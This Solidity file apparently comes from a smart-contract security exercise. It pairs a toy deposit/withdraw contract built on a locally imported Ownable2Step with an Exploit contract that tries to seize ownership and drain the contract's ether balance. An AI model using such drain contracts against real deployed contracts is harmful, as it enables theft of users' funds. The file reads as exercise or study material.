pragma solidity 0.8.19;

import "./Ownable2Step.sol";

contract IOwnership is Ownable2Step {
    event Deposit(address indexed depositor, uint256 amount);
    event Withdraw(address indexed withdrawer, uint256 amount);

    function deposit() external payable {
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
        emit Withdraw(msg.sender, balance);
    }
}


contract Exploit {
    IOwnership ownership;

    constructor(address ownershipAddress) {
        ownership = IOwnership(ownershipAddress);
    }

    function attack() external {
        ownership.transferOwnership(address(this));
        ownership.acceptOwnership();
        ownership.withdraw();
    }
    
    receive() external payable {}
}
    